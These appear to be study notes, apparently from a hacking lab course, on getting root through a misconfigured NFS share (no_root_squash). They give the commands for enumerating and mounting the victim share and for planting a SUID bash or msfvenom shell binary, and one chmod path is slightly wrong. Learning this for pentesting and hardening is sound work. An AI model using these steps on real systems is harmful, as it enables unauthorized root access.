NFS=Network File Share
#### cat /etc/exports
This command show the nfs configure file if it exists.
- We have to look for in the configuration file if the protection is  no_root_squash or root_squash.If it is no_root_squash
  then privilege escalation is possible.We aslo look for which folder is shared.We find these info in conf file.
#### From our attacking machine we scan the victim ip using nmap to see if nfs is available or not.
- nmap 10.10.12.172
#### showmount -e 10.10.12.172
- the above command show which folder is shared in the target system.
#### Mount the shared folder with attacker machine
- create a folder in /mnt default folder
- "mkdir /mnt/tmp"  this will create a folder name tmp in /mnt folder.
- "mount -o rw,vers=3 10.10.12.172:/tmp /mnt/tmp"   (this will mount the victim /tmp shared folder with attacker /mnt/tmp folder
- now from attacker machine we can create file will for setting suid,reverse shell,using msfvenom or other ways to take
  root shell
#### Getting shell
- we can copy /bin/bash into attacker tmp folder using "cp /bin/bash ." .Then we need to make it executable "chmod +sx ./bin/bash"
then we will run the "./bash -p" in victim machine.
- use msfvenom in attacker tmp folder "msfvenom -p linux/x64/exec CMD="/bin/sh" -f elf -o shell" this command create
  a shell file.We will this  "chmod +xs ./shell" to make is executable.In victim machine we will "./shell" to run the command
  which will give us root shell into victim machine.
#### Resources
- https://www.youtube.com/watch?v=R8CdLJM5w9c&list=PL-DxAN1jsRa818Ew7WI1_ngpULwDDESSI&index=7
- https://touhidshaikh.com/blog/2018/04/nfs-weak-permissionslinux-privilege-escalation/
  
